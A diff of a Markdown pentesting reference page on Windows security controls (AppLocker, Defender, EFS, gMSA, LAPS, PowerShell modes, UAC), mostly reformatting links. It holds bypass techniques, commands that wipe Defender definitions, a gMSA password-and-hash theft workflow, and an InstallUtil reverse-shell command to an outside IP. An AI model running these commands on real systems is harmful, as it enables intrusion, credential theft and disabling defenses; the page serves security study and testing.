@@ -1,11 +1,10 @@
 # Windows Security Controls
 
-
 ## AppLocker Policy
 
 An application whitelist is a list of approved software applications or executables that are allowed to be present and run on a system. The goal is to protect the environment from harmful malware and unapproved software that does not align with the specific business needs of an organization.
 
-[[https://docs.microsoft.com/en-us/windows/security/threat-protection/windows-defender-application-control/applocker/what-is-applocker|AppLocker]] is Microsoft's **application whitelisting solution** and gives system administrators control over **which applications and files users can run**. It provides **granular control** over executables, scripts, Windows installer files, DLLs, packaged apps, and packed app installers.\
+[AppLocker](https://docs.microsoft.com/en-us/windows/security/threat-protection/windows-defender-application-control/applocker/what-is-applocker) is Microsoft's **application whitelisting solution** and gives system administrators control over **which applications and files users can run**. It provides **granular control** over executables, scripts, Windows installer files, DLLs, packaged apps, and packed app installers.\
 It is common for organizations to **block cmd.exe and PowerShell.exe** and write access to certain directories, **but this can all be bypassed**.
 
 ### Check
@@ -20,7 +19,7 @@ Get-AppLockerPolicy -Effective | select -ExpandProperty RuleCollections
 $a = Get-ApplockerPolicy -effective
 $a.rulecollections
 ```
-```
+
 This registry path contains the configurations and policies applied by AppLocker, providing a way to review the current set of rules enforced on the system:
 
 - `HKLM\Software\Policies\Microsoft\Windows\SrpV2`
@@ -35,13 +34,13 @@ C:\Windows\System32\spool\drivers\color
 C:\Windows\Tasks
 C:\windows\tracing
 ```
-```
-- Commonly **trusted** [[https://lolbas-project.github.io/|**"LOLBAS's"**]] binaries can be also useful to bypass AppLocker.
+
+- Commonly **trusted** [**"LOLBAS's"**](https://lolbas-project.github.io/) binaries can be also useful to bypass AppLocker.
 - **Poorly written rules could also be bypassed**
   - For example, **`<FilePathCondition Path="%OSDRIVE%*\allowed*"/>`**, you can create a **folder called `allowed`** anywhere and it will be allowed.
-  - Organizations also often focus on **blocking the `%System32%\WindowsPowerShell\v1.0\powershell.exe` executable**, but forget about the **other** [[https://www.powershelladmin.com/wiki/PowerShell_Executables_File_System_Locations|**PowerShell executable locations**]] such as `%SystemRoot%\SysWOW64\WindowsPowerShell\v1.0\powershell.exe` or `PowerShell_ISE.exe`.
+  - Organizations also often focus on **blocking the `%System32%\WindowsPowerShell\v1.0\powershell.exe` executable**, but forget about the **other** [**PowerShell executable locations**](https://www.powershelladmin.com/wiki/PowerShell_Executables_File_System_Locations) such as `%SystemRoot%\SysWOW64\WindowsPowerShell\v1.0\powershell.exe` or `PowerShell_ISE.exe`.
 - **DLL enforcement very rarely enabled** due to the additional load it can put on a system, and the amount of testing required to ensure nothing will break. So using **DLLs as backdoors will help bypassing AppLocker**.
-- You can use [[https://github.com/PowerShellEmpire/PowerTools/tree/master/PowerPick) or [**SharpPick**](https://github.com/PowerShellEmpire/PowerTools/tree/master/PowerPick) to **execute Powershell** code in any process and bypass AppLocker. For more info check: [https://hunter2.gitbook.io/darthsidious/defense-evasion/bypassing-applocker-and-powershell-contstrained-language-mode](https://hunter2.gitbook.io/darthsidious/defense-evasion/bypassing-applocker-and-powershell-contstrained-language-mode|**ReflectivePick**]].
+- You can use [**ReflectivePick**](https://github.com/PowerShellEmpire/PowerTools/tree/master/PowerPick) or [**SharpPick**](https://github.com/PowerShellEmpire/PowerTools/tree/master/PowerPick) to **execute Powershell** code in any process and bypass AppLocker. For more info check: [https://hunter2.gitbook.io/darthsidious/defense-evasion/bypassing-applocker-and-powershell-contstrained-language-mode](https://hunter2.gitbook.io/darthsidious/defense-evasion/bypassing-applocker-and-powershell-contstrained-language-mode).
 
 ## Credentials Storage
 
@@ -72,13 +71,13 @@ It is the database of the Active Directory. It is only present in Domain Control
 
 ## Defender
 
-[[https://en.wikipedia.org/wiki/Microsoft_Defender|**Microsoft Defender**]] is an Antivirus that is available in Windows 10 and Windows 11, and in versions of Windows Server. It **blocks** common pentesting tools such as **`WinPEAS`**. However, there are ways to **bypass these protections**.
+[**Microsoft Defender**](https://en.wikipedia.org/wiki/Microsoft_Defender) is an Antivirus that is available in Windows 10 and Windows 11, and in versions of Windows Server. It **blocks** common pentesting tools such as **`WinPEAS`**. However, there are ways to **bypass these protections**.
 
 ### Check
 
 To check the **status** of **Defender** you can execute the PS cmdlet **`Get-MpComputerStatus`** (check the value of **`RealTimeProtectionEnabled`** to know if it's active):
 
-_PS C:\> Get-MpComputerStatus
+<pre class="language-powershell"><code class="lang-powershell">PS C:\> Get-MpComputerStatus
 
 [...]
 AntispywareEnabled              : True
@@ -90,10 +89,10 @@ AntivirusEnabled                : True
 NISEnabled                      : False
 NISEngineVersion                : 0.0.0.0
 [...]
-RealTimeProtectionEnabled       : True
-RealTimeScanDirection           : 0
+<strong>RealTimeProtectionEnabled       : True
+</strong>RealTimeScanDirection           : 0
 PSComputerName                  :
-```
+</code></pre>
 
 To enumerate it you could also run:
 
@@ -105,14 +104,14 @@ sc query windefend
 #Delete all rules of Defender (useful for machines without internet access)
 "C:\Program Files\Windows Defender\MpCmdRun.exe" -RemoveDefinitions -All
 ```
-```
+
 ## Encrypted File System (EFS)
 
-EFS secures files through encryption, utilizing a **symmetric key** known as the **File Encryption Key (FEK)**. This key is encrypted with the user's **public key** and stored within the encrypted file's $EFS **alternative data stream**. When decryption is needed, the corresponding **private key** of the user's digital certificate is used to decrypt the FEK from the $EFS stream. More details can be found [[https://en.wikipedia.org/wiki/Encrypting_File_System|here]].
+EFS secures files through encryption, utilizing a **symmetric key** known as the **File Encryption Key (FEK)**. This key is encrypted with the user's **public key** and stored within the encrypted file's $EFS **alternative data stream**. When decryption is needed, the corresponding **private key** of the user's digital certificate is used to decrypt the FEK from the $EFS stream. More details can be found [here](https://en.wikipedia.org/wiki/Encrypting_File_System).
 
 **Decryption scenarios without user initiation** include:
 
-- When files or folders are moved to a non-EFS file system, like [[https://en.wikipedia.org/wiki/File_Allocation_Table|FAT32]], they are automatically decrypted.
+- When files or folders are moved to a non-EFS file system, like [FAT32](https://en.wikipedia.org/wiki/File_Allocation_Table), they are automatically decrypted.
 - Encrypted files sent over the network via SMB/CIFS protocol are decrypted prior to transmission.
 
 This encryption method allows **transparent access** to encrypted files for the owner. However, simply changing the owner's password and logging in will not permit decryption.
@@ -151,19 +150,19 @@ Microsoft developed **Group Managed Service Accounts (gMSA)** to simplify the ma
 - **Scheduled Task Capability**: Unlike managed service accounts, gMSAs support running scheduled tasks.
 - **Simplified SPN Management**: The system automatically updates the Service Principal Name (SPN) when there are changes to the computer's sAMaccount details or DNS name, simplifying SPN management.
 
-The passwords for gMSAs are stored in the LDAP property _**msDS-ManagedPassword**_ and are automatically reset every 30 days by Domain Controllers (DCs). This password, an encrypted data blob known as [[https://docs.microsoft.com/en-us/openspecs/windows_protocols/ms-adts/a9019740-3d73-46ef-a9ae-3ea8eb86ac2e|MSDS-MANAGEDPASSWORD_BLOB]], can only be retrieved by authorized administrators and the servers on which the gMSAs are installed, ensuring a secure environment. To access this information, a secured connection such as LDAPS is required, or the connection must be authenticated with 'Sealing & Secure'.
+The passwords for gMSAs are stored in the LDAP property _**msDS-ManagedPassword**_ and are automatically reset every 30 days by Domain Controllers (DCs). This password, an encrypted data blob known as [MSDS-MANAGEDPASSWORD_BLOB](https://docs.microsoft.com/en-us/openspecs/windows_protocols/ms-adts/a9019740-3d73-46ef-a9ae-3ea8eb86ac2e), can only be retrieved by authorized administrators and the servers on which the gMSAs are installed, ensuring a secure environment. To access this information, a secured connection such as LDAPS is required, or the connection must be authenticated with 'Sealing & Secure'.
 
-![[../../images/asd1.png|https://cube0x0.github.io/Relaying-for-gMSA/]]
+![https://cube0x0.github.io/Relaying-for-gMSA/](../../images/asd1.png)
 
-You can read this password with [[https://github.com/rvazarkar/GMSAPasswordReader|**GMSAPasswordReader**]]**:**
+You can read this password with [**GMSAPasswordReader**](https://github.com/rvazarkar/GMSAPasswordReader)**:**
 
 ```
 /GMSAPasswordReader --AccountName jkohler
 ```
-```
-[[https://cube0x0.github.io/Relaying-for-gMSA/|**Find more info in this post**]]
 
-Also, check this [[https://cube0x0.github.io/Relaying-for-gMSA/|web page]] about how to perform a **NTLM relay attack** to **read** the **password** of **gMSA**.
+[**Find more info in this post**](https://cube0x0.github.io/Relaying-for-gMSA/)
+
+Also, check this [web page](https://cube0x0.github.io/Relaying-for-gMSA/) about how to perform a **NTLM relay attack** to **read** the **password** of **gMSA**.
 
 ### Abusing ACL chaining to read gMSA managed password (GenericAll -> ReadGMSAPassword)
 
@@ -182,7 +181,7 @@ Typical workflow:
 ```bash
 bloodyAD --host <DC.FQDN> -d <domain> -u <user> -p <pass> add groupMember <GroupWithReadGmsa> <user>
 ```
-```
+
 3) Read the gMSA managed password via LDAP and derive the NTLM hash. NetExec automates the extraction of `msDS-ManagedPassword` and conversion to NTLM:
 
 ```bash
@@ -190,7 +189,7 @@ bloodyAD --host <DC.FQDN> -d <domain> -u <user> -p <pass> add groupMember <Group
 netexec ldap <DC.FQDN> -u <user> -p <pass> --gmsa
 # Account: mgtsvc$  NTLM: edac7f05cded0b410232b7466ec47d6f
 ```
-```
+
 4) Authenticate as the gMSA using the NTLM hash (no plaintext needed). If the account is in Remote Management Users, WinRM will work directly:
 
 ```bash
@@ -198,22 +197,21 @@ netexec ldap <DC.FQDN> -u <user> -p <pass> --gmsa
 netexec smb   <DC.FQDN> -u 'mgtsvc$' -H <NTLM>
 netexec winrm <DC.FQDN> -u 'mgtsvc$' -H <NTLM>
 ```
-```
+
 Notes:
 - LDAP reads of `msDS-ManagedPassword` require sealing (e.g., LDAPS/sign+seal). Tools handle this automatically.
 - gMSAs are often granted local rights like WinRM; validate group membership (e.g., Remote Management Users) to plan lateral movement.
 - If you only need the blob to compute the NTLM yourself, see MSDS-MANAGEDPASSWORD_BLOB structure.
 
-
 ## LAPS
 
-The **Local Administrator Password Solution (LAPS)**, available for download from [[https://www.microsoft.com/en-us/download/details.aspx?id=46899|Microsoft]], enables the management of local Administrator passwords. These passwords, which are **randomized**, unique, and **regularly changed**, are stored centrally in Active Directory. Access to these passwords is restricted through ACLs to authorized users. With sufficient permissions granted, the ability to read local admin passwords is provided.
+The **Local Administrator Password Solution (LAPS)**, available for download from [Microsoft](https://www.microsoft.com/en-us/download/details.aspx?id=46899), enables the management of local Administrator passwords. These passwords, which are **randomized**, unique, and **regularly changed**, are stored centrally in Active Directory. Access to these passwords is restricted through ACLs to authorized users. With sufficient permissions granted, the ability to read local admin passwords is provided.
 
 [[../active-directory-methodology/laps.md]]
 
 ## PS Constrained Language Mode
 
-PowerShell [[https://devblogs.microsoft.com/powershell/powershell-constrained-language-mode/|**Constrained Language Mode**]] **locks down many of the features** needed to use PowerShell effectively, such as blocking COM objects, only allowing approved .NET types, XAML-based workflows, PowerShell classes, and more.
+PowerShell [**Constrained Language Mode**](https://devblogs.microsoft.com/powershell/powershell-constrained-language-mode/) **locks down many of the features** needed to use PowerShell effectively, such as blocking COM objects, only allowing approved .NET types, XAML-based workflows, PowerShell classes, and more.
 
 ### **Check**
 
@@ -221,15 +219,15 @@ PowerShell [[https://devblogs.microsoft.com/powershell/powershell-constrained-la
 $ExecutionContext.SessionState.LanguageMode
 #Values could be: FullLanguage or ConstrainedLanguage
 ```
-```
+
 ### Bypass
 
 ```bash
 #Easy bypass
 Powershell -version 2
 ```
-```
-In current Windows that Bypass won't work but you can use[[https://github.com/padovah4ck/PSByPassCLM| **PSByPassCLM**]].\
+
+In current Windows that Bypass won't work but you can use[ **PSByPassCLM**](https://github.com/padovah4ck/PSByPassCLM).\
 **To compile it you may need** **to** _**Add a Reference**_ -> _Browse_ ->_Browse_ -> add `C:\Windows\Microsoft.NET\assembly\GAC_MSIL\System.Management.Automation\v4.0_3.0.0.0\31bf3856ad364e35\System.Management.Automation.dll` and **change the project to .Net4.5**.
 
 #### Direct bypass:
@@ -237,14 +235,14 @@ In current Windows that Bypass won't work but you can use[[https://github.com/pa
 ```bash
 C:\Windows\Microsoft.NET\Framework64\v4.0.30319\InstallUtil.exe /logfile= /LogToConsole=true /U c:\temp\psby.exe
 ```
-```
+
 #### Reverse shell:
 
 ```bash
 C:\Windows\Microsoft.NET\Framework64\v4.0.30319\InstallUtil.exe /logfile= /LogToConsole=true /revshell=true /rhost=10.10.13.206 /rport=443 /U c:\temp\psby.exe
 ```
-```
-You can use [[https://github.com/PowerShellEmpire/PowerTools/tree/master/PowerPick) or [**SharpPick**](https://github.com/PowerShellEmpire/PowerTools/tree/master/PowerPick) to **execute Powershell** code in any process and bypass the constrained mode. For more info check: [https://hunter2.gitbook.io/darthsidious/defense-evasion/bypassing-applocker-and-powershell-contstrained-language-mode](https://hunter2.gitbook.io/darthsidious/defense-evasion/bypassing-applocker-and-powershell-contstrained-language-mode|**ReflectivePick**]].
+
+You can use [**ReflectivePick**](https://github.com/PowerShellEmpire/PowerTools/tree/master/PowerPick) or [**SharpPick**](https://github.com/PowerShellEmpire/PowerTools/tree/master/PowerPick) to **execute Powershell** code in any process and bypass the constrained mode. For more info check: [https://hunter2.gitbook.io/darthsidious/defense-evasion/bypassing-applocker-and-powershell-contstrained-language-mode](https://hunter2.gitbook.io/darthsidious/defense-evasion/bypassing-applocker-and-powershell-contstrained-language-mode).
 
 ## PS Execution Policy
 
@@ -269,8 +267,8 @@ Powershell -command "Write-Host 'My voice is my passport, verify me.'"
 9º Use EncodeCommand
 $command = "Write-Host 'My voice is my passport, verify me.'" $bytes = [System.Text.Encoding]::Unicode.GetBytes($command) $encodedCommand = [Convert]::ToBase64String($bytes) powershell.exe -EncodedCommand $encodedCommand
 ```
-```
-More can be found [[https://blog.netspi.com/15-ways-to-bypass-the-powershell-execution-policy/|here]]
+
+More can be found [here](https://blog.netspi.com/15-ways-to-bypass-the-powershell-execution-policy/)
 
 ## Security Support Provider Interface (SSPI)
 
@@ -295,13 +293,13 @@ The SSPI will be in charge of finding the adequate protocol for two machines tha
 
 ## UAC - User Account Control
 
-[[https://docs.microsoft.com/en-us/windows/security/identity-protection/user-account-control/how-user-account-control-works|User Account Control (UAC)]] is a feature that enables a **consent prompt for elevated activities**.
+[User Account Control (UAC)](https://docs.microsoft.com/en-us/windows/security/identity-protection/user-account-control/how-user-account-control-works) is a feature that enables a **consent prompt for elevated activities**.
 
 [[uac-user-account-control.md]]
 
 ## References
 
-- [[https://cube0x0.github.io/Relaying-for-gMSA/|Relaying for gMSA – cube0x0]]
-- [[https://github.com/rvazarkar/GMSAPasswordReader|GMSAPasswordReader]]
-- [[https://0xdf.gitlab.io/2025/08/28/htb-sendai.html|HTB Sendai – 0xdf: gMSA via rights chaining to WinRM]]
+- [Relaying for gMSA – cube0x0](https://cube0x0.github.io/Relaying-for-gMSA/)
+- [GMSAPasswordReader](https://github.com/rvazarkar/GMSAPasswordReader)
+- [HTB Sendai – 0xdf: gMSA via rights chaining to WinRM](https://0xdf.gitlab.io/2025/08/28/htb-sendai.html)
 
